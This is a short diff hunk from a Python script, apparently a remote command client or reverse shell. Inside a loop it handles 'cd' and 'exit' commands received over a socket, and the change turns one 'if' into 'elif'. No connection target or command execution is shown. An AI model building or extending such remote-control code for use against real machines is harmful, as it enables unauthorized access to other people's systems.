@@ -33,7 +33,7 @@ while True:
         os.chdir(str(command[3:]))  #Force change directory with built in OS function 
         s.send(os.getcwd().encode()) 
 
-    if 'exit' in command:
+    elif 'exit' in command:
         s.close()
         sys.exit()
 
